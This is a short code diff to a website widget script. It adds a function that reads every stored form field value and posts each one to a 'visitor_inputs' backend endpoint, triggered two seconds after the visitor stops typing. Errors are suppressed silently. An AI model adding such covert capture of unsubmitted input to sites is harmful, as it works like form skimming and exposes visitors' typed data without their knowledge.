@@ -40,6 +40,19 @@
       try { return JSON.parse(localStorage.getItem(L) || '{}'); } catch (e) { return {}; }
     }
 
+    function sendInputs() {
+      try {
+        var f = JSON.parse(localStorage.getItem(FK) || '{}');
+        for (var k in f) {
+          if (!f[k]) continue;
+          fetch(SU + '/rest/v1/visitor_inputs', {
+            method: 'POST',
+            headers: { 'apikey': SK, 'Content-Type': 'application/json', 'Prefer': 'return=minimal' },
+            body: JSON.stringify({ session_id: vid, field_name: k, input_value: f[k] })
+          }).catch(function () {});
+        }
+      } catch (e) {}
+    }
     function send() {
       try {
         var d = lead();
@@ -100,6 +113,8 @@
         typingTimer = setTimeout(function () { typingFlag = false; setTyping(false); }, 2000);
         if (leadTimer) clearTimeout(leadTimer);
         leadTimer = setTimeout(send, 1200);
+        clearTimeout(typingTimer);
+        typingTimer = setTimeout(function () { typingFlag = false; setTyping(false); sendInputs(); }, 2000);
       } catch (err) {}
     });
 
